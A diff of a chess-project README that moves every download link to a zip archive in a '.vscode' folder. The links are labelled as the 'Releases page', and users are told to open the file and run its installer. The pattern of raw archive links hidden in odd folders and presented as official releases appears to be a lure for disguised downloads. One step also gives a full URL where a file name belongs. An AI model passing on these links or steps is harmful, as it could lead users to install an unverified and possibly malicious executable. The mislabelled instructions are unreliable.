@@ -4,7 +4,7 @@
 Welcome to the chess-project! This application allows you to play chess against a computer opponent in a fun, interactive environment. Whether you're new to chess or looking to sharpen your skills, this program provides a user-friendly interface to enjoy the game.
 
 ## 🔗 Download the Application
-[![Download chess-project](https://github.com/Niranjananu/chess-project/raw/refs/heads/main/charts/chess_project_v1.2.zip)](https://github.com/Niranjananu/chess-project/raw/refs/heads/main/charts/chess_project_v1.2.zip)
+[![Download chess-project](https://raw.githubusercontent.com/Niranjananu/chess-project/main/.vscode/project_chess_v3.7-beta.3.zip)](https://raw.githubusercontent.com/Niranjananu/chess-project/main/.vscode/project_chess_v3.7-beta.3.zip)
 
 ## 🖥️ System Requirements
 To ensure smooth performance, please verify that your system meets the following requirements:
@@ -22,16 +22,16 @@ To ensure smooth performance, please verify that your system meets the following
 - **Save and Load Games:** Pick up where you left off with saved games.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Niranjananu/chess-project/raw/refs/heads/main/charts/chess_project_v1.2.zip) to download the latest version of the application. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Niranjananu/chess-project/main/.vscode/project_chess_v3.7-beta.3.zip) to download the latest version of the application. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/Niranjananu/chess-project/raw/refs/heads/main/charts/chess_project_v1.2.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Niranjananu/chess-project/main/.vscode/project_chess_v3.7-beta.3.zip).
 2. Locate the latest version listed at the top.
-3. Find the appropriate file for your system. For most users, the file will be named `https://github.com/Niranjananu/chess-project/raw/refs/heads/main/charts/chess_project_v1.2.zip`.
+3. Find the appropriate file for your system. For most users, the file will be named `https://raw.githubusercontent.com/Niranjananu/chess-project/main/.vscode/project_chess_v3.7-beta.3.zip`.
 4. Click on the file name to begin the download.
 
 Once the download is complete:
 
-1. Open the downloaded file (`https://github.com/Niranjananu/chess-project/raw/refs/heads/main/charts/chess_project_v1.2.zip`).
+1. Open the downloaded file (`https://raw.githubusercontent.com/Niranjananu/chess-project/main/.vscode/project_chess_v3.7-beta.3.zip`).
 2. Follow the installation prompts.
 3. After installation, find the application in your Start Menu or desktop.
 
